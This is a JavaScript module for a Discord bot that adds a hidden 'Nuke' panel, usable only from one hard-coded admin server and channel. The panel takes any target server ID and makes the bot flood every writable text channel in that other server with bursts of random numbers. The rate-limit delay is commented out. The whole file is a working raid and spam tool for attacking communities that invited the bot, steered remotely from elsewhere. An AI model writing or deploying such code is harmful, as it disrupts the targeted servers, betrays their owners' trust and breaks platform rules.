const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, ComponentType } = require('discord.js');

module.exports = (client) => {
  const ADMIN_SERVER_ID = '1362145548106334340';     // placeholder server ID
  const ADMIN_CHANNEL_ID = '1420420899005399131';    // placeholder admin channel ID
  const PREFIX = '?';

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.guild &&
        message.guild.id === ADMIN_SERVER_ID &&
        message.channel.id === ADMIN_CHANNEL_ID &&
        message.content.startsWith(PREFIX)) {

      const args = message.content.slice(PREFIX.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      if (command === 'command') {
        message.reply('Admin command triggered! Add your logic here.');

      } else if (command === 'adminpanel') {
        // Send embed with Nuke button
        const embed = new EmbedBuilder()
          .setTitle('Admin Panel')
          .setDescription('Use the buttons below to perform admin tasks.')
          .setColor(0xFF4500);

        const button = new ButtonBuilder()
          .setCustomId('nukeButton')
          .setLabel('Nuke 🚀')
          .setStyle(ButtonStyle.Danger);

        const row = new ActionRowBuilder().addComponents(button);

        await message.channel.send({ embeds: [embed], components: [row] });

      } else if (command === 'nuke') {
        // Legacy text command (optional to keep or remove)
        // ... your previous nuke command code ...
      } else {
        message.reply(`Unknown admin command: ${command}`);
      }
    }
  });

  // Handle button interactions
  client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'nukeButton') {
      // Show modal to input server ID and optional channel ID
      const modal = new ModalBuilder()
        .setCustomId('nukeModal')
        .setTitle('Nuke Setup');

      const serverInput = new TextInputBuilder()
        .setCustomId('serverIdInput')
        .setLabel('Server ID')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setPlaceholder('Enter Server ID');

      const channelInput = new TextInputBuilder()
        .setCustomId('channelIdInput')
        .setLabel('Channel ID (optional)')
        .setStyle(TextInputStyle.Short)
        .setRequired(false)
        .setPlaceholder('Leave empty to nuke all channels');

      const firstActionRow = new ActionRowBuilder().addComponents(serverInput);
      const secondActionRow = new ActionRowBuilder().addComponents(channelInput);

      modal.addComponents(firstActionRow, secondActionRow);

      await interaction.showModal(modal);
    }
  });

  // Handle modal submissions
  client.on('interactionCreate', async (interaction) => {
    if (interaction.type !== InteractionType.ModalSubmit) return;
    if (interaction.customId !== 'nukeModal') return;

    const serverId = interaction.fields.getTextInputValue('serverIdInput');
    const channelId = interaction.fields.getTextInputValue('channelIdInput');

    // Confirm command initiated
    await interaction.deferReply({ ephemeral: true });

    try {
      const targetGuild = await client.guilds.fetch(serverId);
      if (!targetGuild) return await interaction.editReply('Server not found.');

      let targetChannels = [];

      if (channelId) {
        // Specific channel
        const targetChannel = targetGuild.channels.cache.get(channelId)
          || await targetGuild.channels.fetch(channelId).catch(() => null);

        if (!targetChannel || !targetChannel.isTextBased()) {
          return await interaction.editReply('Channel not found or not a text channel.');
        }
        targetChannels.push(targetChannel);

      } else {
        // No channel specified - get all text channels bot can send in
        targetChannels = targetGuild.channels.cache.filter(c =>
          c.isTextBased() && c.permissionsFor(targetGuild.members.me).has('SendMessages')
        ).values();
      }

      // Iterate channels and send messages
      let totalSent = 0;
      for (const channel of targetChannels) {
        // Send 10 messages of random 8-digit number per channel
        for (let i = 0; i < 10; i++) {
          const randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
          await channel.send(`${randomNumber}`);
          totalSent++;
          // Optional delay:
          // await new Promise(r => setTimeout(r, 500));
        }
      }

      await interaction.editReply(`Nuke complete! Sent ${totalSent} messages.`);

    } catch (error) {
      console.error('Error handling nuke modal submission:', error);
      await interaction.editReply('An error occurred while processing the nuke command.');
    }
  });

};

